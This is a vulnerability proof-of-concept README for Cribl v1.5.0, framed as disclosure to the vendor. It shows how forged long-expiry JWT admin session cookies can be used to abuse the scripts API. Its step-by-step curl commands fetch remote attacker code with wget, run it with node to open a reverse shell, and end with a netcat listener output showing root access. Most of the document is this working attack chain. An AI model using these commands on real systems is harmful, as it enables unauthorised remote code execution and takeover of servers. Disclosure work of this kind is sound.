# Disclaimer  
This is for informational/educational purposes only.  
This was put together to demonstrate an insecurity in the tool, in order for a fix to be verified by the vendor.
# Info
Tested on Cribl v1.5.0 - Previous versions not tested but likely vulnerable.  
A valid JWT token can be transfered from and injected into the session of another Cribl instance, giving the user unauthorised access.  
Furthermore, the encryption key used on to generate the JWT/Session can be used to create a valid session for any username, with an extended expiry.  
  
This, combined with the ability to run scripts within Cribl allows a  remote attacker to run malicious code on a Crible instance in order to gain further control.  
An example of such can be seen below, using the scripts  page and a long expiry JWT token, it was possible to create a reverse shell.  
  
Tested using Docker (Alpine).


# Running
First, modify (the remote host name) and upload your shell.js to your webserver. The file contains NodeJS code to create a reverse shell to your website.  
The server must have outbound network access to your remote host/port.  
  
Secondly, setup a listener on your remote host, on the port matching the shell.js:
```
nc -lvp 6669
``` 

Adjust the following curl commands with your remote file.  
Run the CURL commands in order, the outputs should roughly match the indents below.

```
curl 'http://CRIBL_URL:9000/api/v1/system/scripts' \
-H 'Content-Type: application/json' \
-H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY' \
--data-binary '{"id":"runme","command":"/usr/bin/wget","args":["http://yourURL/cribl.js","-P","/opt"],"env":{}}' --compressed
```

> "count":1,"items":[{"command":"/usr/bin/wget","args":["http://yourURL/cribl.js","-P","/opt"],"env":{},"id":"runme"}]}

```
curl 'http://CRIBL_URL:9000/api/v1/system/scripts/runme/run' \
-H 'Content-Type: application/json' \
-H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU0OTUyMTU5fQ.W4YDcUJhshv2R25UcumlP4H-2vaCIiJL0hME4eZFIW0' \
--data-binary '{}' --compressed
```
> {"pid":414,"stdout":"N/A","stderr":"N/A"}


```
curl 'http://CRIBL_URL:9000/api/v1/system/scripts' \
 -H 'Content-Type: application/json'\
 -H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY' \
--data-binary '{"id":"reverseit","command":"node","args":["/opt/cribl.js"],"env":{}}' --compressed
```
> "count":1,"items":[{"command":"node","args":["/opt/cribl.js"],"env":{},"id":"reverseit"}]}


```
curl 'http://CRIBL_URL:9000/api/v1/system/scripts/reverseit/run' \
-H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY' \
--data-binary '{}' --compressed
```
> {"pid":353,"stdout":"N/A","stderr":"N/A"}

# Output
```nc -lvp 6669  
Listening on [0.0.0.0] (family 0, port 6669)  
Connection from [188.29.XXX.XXX] port 6669 [tcp/*] accepted (family 2, sport 13720)  
> whoami  
< root  
  
> ls /  
< bin  
< dev  
< etc  
< home  
< lib  
...
```

